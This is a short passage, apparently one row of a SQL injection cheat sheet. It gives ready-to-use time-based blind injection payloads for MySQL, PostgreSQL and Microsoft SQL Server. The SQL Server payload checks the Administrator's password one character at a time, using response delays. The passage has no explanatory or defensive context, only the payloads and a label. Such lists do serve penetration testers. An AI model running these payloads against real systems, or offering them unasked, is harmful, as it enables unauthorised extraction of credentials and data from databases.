...
| mysql `qsduqzln12aze' || (SELECT sleep(10))` postgresql `qsduqzln12aze' || (SELECT pg_sleep(10))` microsoft sql `'; IF (SELECT COUNT(Username) FROM Users WHERE Username = 'Administrator' AND SUBSTRING(Password, 1, 1) > 'm') = 1 WAITFOR DELAY '0:0:{delay}'--` | time based query |
